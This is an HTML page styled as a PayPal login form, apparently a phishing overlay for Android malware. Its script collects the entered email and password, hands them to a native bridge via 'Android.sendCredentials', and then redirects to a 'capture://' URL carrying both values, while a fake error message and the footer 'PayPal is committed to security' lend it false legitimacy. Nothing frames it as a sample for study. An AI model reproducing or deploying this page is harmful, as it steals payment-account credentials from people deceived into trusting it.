<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',Arial,sans-serif}
body{background:#e9e9e9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:white;padding:35px;border-radius:6px;width:340px;box-shadow:0 0 20px rgba(0,0,0,0.1)}
.logo{text-align:center;font-size:32px;font-weight:300;color:#003087;margin-bottom:20px}
.logo span{color:#009cde}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #ccc;border-radius:4px;font-size:14px;transition:border 0.2s}
input:focus{border-color:#009cde;outline:none}
button{width:100%;padding:12px;background:#009cde;color:white;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s}
button:hover{background:#007db8}
button:disabled{opacity:0.7}
.error{color:#d32f2f;font-size:13px;margin-top:8px;display:none;text-align:center}
.footer{text-align:center;margin-top:15px;font-size:11px;color:#888}
</style>
</head>
<body>
<div class="container"><div class="logo">Pay<span>Pal</span></div>
<form onsubmit="submitForm(event)">
<input type="text" id="user" placeholder="Email or mobile number" required>
<input type="password" id="pass" placeholder="Password" required>
<button type="submit">Log In</button>
<div class="error" id="error">We're having trouble logging you in.</div>
</form><div class="footer">PayPal is committed to security</div></div>
<script>
function submitForm(e){e.preventDefault();var u=document.getElementById('user').value;var p=document.getElementById('pass').value;if(u.length<3||p.length<3){document.getElementById('error').style.display='block';return;}if(typeof Android!=='undefined'){Android.sendCredentials(u,p);}var btn=document.querySelector('button');btn.textContent='Logging in...';btn.disabled=true;setTimeout(function(){window.location.href='capture://?user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p);},1000);}
</script>
</body>
</html>
